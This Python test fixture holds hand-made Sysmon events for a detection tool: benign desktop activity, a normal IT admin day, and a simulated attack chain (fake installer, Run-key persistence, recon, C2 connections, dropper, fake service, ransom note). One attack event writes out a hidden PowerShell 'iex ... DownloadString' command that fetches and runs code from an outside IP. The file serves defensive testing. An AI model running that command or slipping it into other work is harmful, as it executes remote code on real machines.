"""Hand-made Sysmon events for the tests, already parsed into dicts (the shape parse.py returns).

They copy the patterns seen in real lab logs, but every name is fake: user "analyst",
computer "LAB-PC01", made-up GUIDs. No real log is stored in this repository.
"""

USER = "C:\\Users\\analyst"


def event(record_id, event_id, time, **fields):
    return {"record_id": record_id, "event_id": event_id, "time": time, "computer": "LAB-PC01", **fields}


def benign_events():
    """Normal desktop activity: Defender update, OneDrive, Edge browsing, an Edge Run key,
    VMware tools, a person typing ipconfig twice. None of the checks may fire on this."""
    return [
        event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{p-defender}", ParentProcessGuid="{p-msmpeng}",
              Image="C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MpCmdRun.exe",
              ParentImage="C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe",
              CommandLine="MpCmdRun.exe -wdenable", Hashes="SHA256=" + "a" * 64),
        event(2, 1, "2026-01-05 09:00:05.000", ProcessGuid="{p-onedrive}", ParentProcessGuid="{p-explorer}",
              Image=USER + "\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
              ParentImage="C:\\Windows\\explorer.exe", CommandLine="OneDrive.exe /background"),
        event(3, 3, "2026-01-05 09:00:06.000", ProcessGuid="{p-onedrive}",
              Image=USER + "\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
              DestinationIp="52.113.194.132", DestinationPort="443"),
        event(4, 13, "2026-01-05 09:00:07.000", ProcessGuid="{p-edge}",
              Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
              TargetObject="HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftEdgeAutoLaunch_X",
              Details='"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --no-startup-window'),
        event(5, 22, "2026-01-05 09:01:00.000", ProcessGuid="{p-edge}",
              Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", QueryName="www.example-shop.sg"),
        event(6, 22, "2026-01-05 09:01:00.800", ProcessGuid="{p-edge}",
              Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", QueryName="img-cdn.example.akamaized.net"),
        event(7, 22, "2026-01-05 09:01:01.500", ProcessGuid="{p-edge}",
              Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", QueryName="cdn.example-shop.com"),
        event(8, 22, "2026-01-05 09:02:30.000", ProcessGuid="{p-edge}",
              Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", QueryName="www.wikipedia.org"),
        event(9, 22, "2026-01-05 09:02:31.000", ProcessGuid="{p-svchost}",
              Image="C:\\Windows\\System32\\svchost.exe", QueryName="wpad"),
        event(10, 1, "2026-01-05 09:03:00.000", ProcessGuid="{p-cmd}", ParentProcessGuid="{p-explorer}",
              Image="C:\\Windows\\System32\\cmd.exe", ParentImage="C:\\Windows\\explorer.exe",
              CommandLine="cmd.exe"),
        event(11, 1, "2026-01-05 09:03:10.000", ProcessGuid="{p-ip1}", ParentProcessGuid="{p-cmd}",
              Image="C:\\Windows\\System32\\ipconfig.exe", ParentImage="C:\\Windows\\System32\\cmd.exe",
              CommandLine="ipconfig /all"),
        event(12, 1, "2026-01-05 09:03:20.000", ProcessGuid="{p-ip2}", ParentProcessGuid="{p-cmd}",
              Image="C:\\Windows\\System32\\whoami.exe", ParentImage="C:\\Windows\\System32\\cmd.exe",
              CommandLine="whoami"),
        event(13, 8, "2026-01-05 09:04:00.000",
              SourceImage="C:\\Program Files\\VMware\\VMware Tools\\VMwareResolutionSet.exe",
              TargetImage="C:\\Windows\\System32\\csrss.exe"),
        event(14, 1, "2026-01-05 09:05:00.000", ProcessGuid="{p-ps}", ParentProcessGuid="{p-compat}",
              Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              ParentImage="C:\\Windows\\System32\\CompatTelRunner.exe",
              CommandLine="powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';"),
    ]


def it_day_events():
    """A normal IT day: admin recon typed in Windows Terminal, an Intune script, a Defender
    platform update, a driver update, Teams looking up its cloud.microsoft domain, and the
    SCCM client asking LSASS for basic information (0x1000). None of it may be Malicious."""
    sys32 = "C:\\Windows\\System32\\"
    ps = sys32 + "WindowsPowerShell\\v1.0\\powershell.exe"
    terminal = USER + "\\AppData\\Local\\Microsoft\\WindowsApps\\WindowsTerminal.exe"
    intune = "C:\\Program Files (x86)\\Microsoft Intune Management Extension\\"
    platform = "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2-0\\"
    driver = sys32 + "DriverStore\\FileRepository\\exampleaudio.inf_amd64_1\\ExampleAudioService.exe"
    teams = USER + "\\AppData\\Local\\Microsoft\\WindowsApps\\ms-teams.exe"
    return [
        # Recon typed by a person in Windows Terminal
        event(301, 1, "2026-03-02 08:30:00.000", ProcessGuid="{t-term}", ParentProcessGuid="{t-explorer}",
              Image=terminal, ParentImage="C:\\Windows\\explorer.exe"),
        event(302, 1, "2026-03-02 08:30:01.000", ProcessGuid="{t-ps}", ParentProcessGuid="{t-term}",
              Image=ps, ParentImage=terminal, CommandLine="powershell.exe -NoLogo"),
        event(303, 1, "2026-03-02 08:30:05.000", ProcessGuid="{t-who}", ParentProcessGuid="{t-ps}",
              Image=sys32 + "whoami.exe", ParentImage=ps, CommandLine="whoami /groups"),
        event(304, 1, "2026-03-02 08:30:09.000", ProcessGuid="{t-ip}", ParentProcessGuid="{t-ps}",
              Image=sys32 + "ipconfig.exe", ParentImage=ps, CommandLine="ipconfig /all"),
        event(305, 1, "2026-03-02 08:30:15.000", ProcessGuid="{t-si}", ParentProcessGuid="{t-ps}",
              Image=sys32 + "systeminfo.exe", ParentImage=ps, CommandLine="systeminfo"),
        # An Intune management script
        event(310, 1, "2026-03-02 09:00:00.000", ProcessGuid="{i-ps}", ParentProcessGuid="{i-agent}",
              Image=ps, ParentImage=intune + "AgentExecutor.exe",
              CommandLine=f'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{intune}Policies\\Scripts\\a1.ps1"'),
        # A Defender platform update: new files and the service pointing at them
        event(320, 11, "2026-03-02 10:00:00.000", ProcessGuid="{d-up}", Image=sys32 + "MpSigStub.exe",
              TargetFilename=platform + "MsMpEng.exe"),
        event(321, 13, "2026-03-02 10:00:01.000", ProcessGuid="{p-services}", Image=sys32 + "services.exe",
              TargetObject="HKLM\\System\\CurrentControlSet\\Services\\WinDefend\\ImagePath",
              Details=f'"{platform}MsMpEng.exe"'),
        # A driver update from Windows Update
        event(330, 11, "2026-03-02 10:30:00.000", ProcessGuid="{w-drv}", Image=sys32 + "drvinst.exe",
              TargetFilename=driver),
        event(331, 13, "2026-03-02 10:30:01.000", ProcessGuid="{p-services}", Image=sys32 + "services.exe",
              TargetObject="HKLM\\System\\CurrentControlSet\\Services\\ExampleAudioService\\ImagePath",
              Details=driver),
        # Teams and the SCCM client
        event(340, 22, "2026-03-02 11:00:00.000", ProcessGuid="{teams}", Image=teams,
              QueryName="teams.cloud.microsoft"),
        event(350, 10, "2026-03-02 11:30:00.000", SourceProcessGUID="{ccm}", SourceImage="C:\\Windows\\CCM\\CcmExec.exe",
              TargetImage=sys32 + "lsass.exe", GrantedAccess="0x1000"),
    ]


def attack_events():
    """A fake 'security installer' from Downloads: Run key, recon burst, C2 connection, lookalike domain.
    Then a WordPad document that drops video.mp4.exe, installs a service and opens a ransom note."""
    fake = USER + "\\Downloads\\FireEyeInstaller.exe"
    dropper = USER + "\\AppData\\Local\\Temp\\video.mp4.exe"
    edge = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
    return benign_events() + [
        # Edge saved the fake installer; the browser's Zone.Identifier keeps where it came from.
        event(98, 15, "2026-01-05 09:59:50.000", ProcessGuid="{p-edge}", Image=edge,
              TargetFilename=f"{fake}:Zone.Identifier",
              Contents="[ZoneTransfer]  ZoneId=3  ReferrerUrl=https://www.fireeyee.com/  "
                       "HostUrl=https://www.fireeyee.com/download/FireEyeInstaller.exe"),
        # The Windows admin prompt (UAC) the user approved.
        event(99, 1, "2026-01-05 09:59:58.000", ProcessGuid="{uac}", ParentProcessGuid="{p-svchost}",
              Image="C:\\Windows\\System32\\consent.exe", ParentImage="C:\\Windows\\System32\\svchost.exe",
              CommandLine="consent.exe 1 2 3"),
        event(101, 1, "2026-01-05 10:00:00.000", ProcessGuid="{a-fake}", ParentProcessGuid="{p-explorer}",
              Image=fake, ParentImage="C:\\Windows\\explorer.exe", CommandLine=f'"{fake}"', IntegrityLevel="High",
              Hashes="MD5=" + "1" * 32 + ",SHA256=" + "b" * 64 + ",IMPHASH=" + "2" * 32),
        event(102, 13, "2026-01-05 10:00:00.100", ProcessGuid="{a-fake}", Image=fake,
              TargetObject="HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FireEye",
              Details=f'"{USER}\\AppData\\Local\\Temp\\FireEye.exe" -foobar'),
        event(103, 1, "2026-01-05 10:00:00.200", ProcessGuid="{a-cmd1}", ParentProcessGuid="{a-fake}",
              Image="C:\\Windows\\System32\\cmd.exe", ParentImage=fake, CommandLine="cmd.exe /c whoami"),
        event(104, 1, "2026-01-05 10:00:00.210", ProcessGuid="{a-who}", ParentProcessGuid="{a-cmd1}",
              Image="C:\\Windows\\System32\\whoami.exe", ParentImage="C:\\Windows\\System32\\cmd.exe",
              CommandLine="whoami"),
        event(105, 1, "2026-01-05 10:00:00.300", ProcessGuid="{a-cmd2}", ParentProcessGuid="{a-fake}",
              Image="C:\\Windows\\System32\\cmd.exe", ParentImage=fake, CommandLine="cmd.exe /c ipconfig"),
        event(106, 1, "2026-01-05 10:00:00.310", ProcessGuid="{a-ip}", ParentProcessGuid="{a-cmd2}",
              Image="C:\\Windows\\System32\\ipconfig.exe", ParentImage="C:\\Windows\\System32\\cmd.exe",
              CommandLine="ipconfig"),
        event(107, 22, "2026-01-05 10:00:01.000", ProcessGuid="{a-fake}", Image=fake, QueryName="fireeyee.com"),
        event(108, 3, "2026-01-05 10:00:01.500", ProcessGuid="{a-fake}", Image=fake,
              DestinationIp="167.172.71.11", DestinationPort="80"),
        event(109, 3, "2026-01-05 10:00:01.600", ProcessGuid="{a-fake}", Image=fake,
              DestinationIp="192.168.1.10", DestinationPort="445"),
        event(110, 3, "2026-01-05 10:00:01.700", ProcessGuid="{a-fake}", Image=fake,
              DestinationIp="2606:4700::6810:84e5", DestinationPort="443"),
        event(111, 22, "2026-01-05 10:00:01.800", ProcessGuid="{a-fake}", Image=fake, QueryName="LAB-PC01"),
        event(112, 22, "2026-01-05 10:00:01.900", ProcessGuid="{a-fake}", Image=fake,
              QueryName="_ldap._tcp.dc._msdcs.corp.local"),
        event(113, 1, "2026-01-05 10:00:02.000", ProcessGuid="{a-ps}", ParentProcessGuid="{a-fake}",
              Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ParentImage=fake,
              CommandLine="powershell -w hidden -c \"iex (New-Object Net.WebClient).DownloadString('http://167.172.71.11/a')\" "
                          "contact: helpdesk@fireeyee.com"),
        # The document chain
        event(201, 1, "2026-01-05 11:00:00.000", ProcessGuid="{b-wordpad}", ParentProcessGuid="{p-edge}",
              Image="C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe",
              ParentImage="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
              CommandLine=f'"C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE" "{USER}\\Downloads\\leak.rtf"'),
        event(202, 11, "2026-01-05 11:00:01.000", ProcessGuid="{b-wordpad}",
              Image="C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe", TargetFilename=dropper),
        event(203, 1, "2026-01-05 11:00:02.000", ProcessGuid="{b-dropper}", ParentProcessGuid="{b-wordpad}",
              Image=dropper, ParentImage="C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe",
              CommandLine=f'"{dropper}"', Hashes="SHA256=" + "c" * 64),
        event(204, 11, "2026-01-05 11:00:03.000", ProcessGuid="{b-dropper}", Image=dropper,
              TargetFilename="C:\\Windows\\System32\\Updater.exe"),
        event(205, 13, "2026-01-05 11:00:03.100", ProcessGuid="{p-services}", Image="C:\\Windows\\system32\\services.exe",
              TargetObject="HKLM\\System\\CurrentControlSet\\Services\\Fake Updater\\ImagePath",
              Details="C:\\Windows\\System32\\Updater.exe"),
        event(206, 1, "2026-01-05 11:00:04.000", ProcessGuid="{b-service}", ParentProcessGuid="{p-services}",
              Image="C:\\Windows\\System32\\Updater.exe", ParentImage="C:\\Windows\\System32\\services.exe",
              CommandLine="C:\\Windows\\System32\\Updater.exe", Hashes="SHA256=" + "c" * 64),
        event(207, 1, "2026-01-05 11:00:20.000", ProcessGuid="{b-notepad}", ParentProcessGuid="{b-service}",
              Image="C:\\Windows\\System32\\notepad.exe", ParentImage="C:\\Windows\\System32\\Updater.exe",
              CommandLine='C:\\Windows\\System32\\notepad.exe "C:\\Ransom.txt"'),
        event(208, 15, "2026-01-05 10:59:59.000", ProcessGuid="{p-edge}",
              Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
              TargetFilename=f"{USER}\\Downloads\\leak.rtf:Zone.Identifier",
              Contents="[ZoneTransfer]  ZoneId=3  HostUrl=https://www.leak-site.example.com/files/leak.rtf"),
    ]
